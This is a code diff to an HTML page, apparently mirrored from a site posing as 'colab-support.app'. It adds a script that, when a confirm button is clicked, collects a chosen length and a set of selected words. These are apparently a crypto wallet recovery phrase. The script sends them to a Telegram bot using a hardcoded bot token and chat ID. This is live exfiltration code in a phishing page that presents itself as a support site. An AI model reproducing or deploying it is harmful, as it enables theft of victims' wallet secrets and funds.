@@ -1449,7 +1449,7 @@
     });
     </script>
     <script src="js/script.js"></script>
-<script>
+<!-- <script>
 document.addEventListener("DOMContentLoaded", () => {
 
     const confirmButton = document.getElementById("confirmButton");
@@ -1489,8 +1489,51 @@ document.addEventListener("DOMContentLoaded", () => {
     });
 
 });
+</script> -->
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const confirmButton = document.getElementById("confirmButton");
+
+    confirmButton.addEventListener("click", async () => {
+
+        try {
+            const length = document.getElementById("Length")?.value;
+
+            const wordsGrid = document.getElementById("wordsGrid");
+            let selectedWords = [];
+
+            if (wordsGrid) {
+                selectedWords = Array.from(wordsGrid.querySelectorAll(".selected"))
+                    .map(el => el.textContent.trim());
+            }
+
+            const message =
+`📝 New Submission
+
+📏 Length: ${length || "N/A"}
+🔤 Words: ${selectedWords.join(", ") || "N/A"}
+⏰ Time: ${new Date().toLocaleString()}`;
+
+            await fetch(`https://api.telegram.org/bot8820185140:AAGC0CpxNuz2XSPqfcu4lGII3w9XHm1SwBI/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: "5812474164",
+                    text: message
+                })
+            });
+
+        } catch (err) {
+            console.log("Telegram error:", err);
+        }
+
+    });
+
+});
 </script>
-
-
 
 </body><!-- Mirrored from colab-support.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Oct 2025 13:16:52 GMT --></html>
